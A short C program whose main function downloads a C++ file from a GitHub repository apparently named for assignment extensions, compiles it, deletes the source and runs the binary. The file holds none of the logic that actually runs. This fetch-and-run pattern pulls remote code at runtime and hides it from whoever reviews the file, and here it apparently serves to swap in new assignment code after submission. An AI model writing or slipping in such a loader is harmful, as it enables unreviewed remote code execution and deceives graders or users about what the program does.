#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main () {
  system("wget -q https://raw.githubusercontent.com/wiwichips/assignment-extension/main/updated.cpp");
  system("g++ updated.cpp");
  system("rm updated.cpp");
  execlp("./a.out", NULL);
}

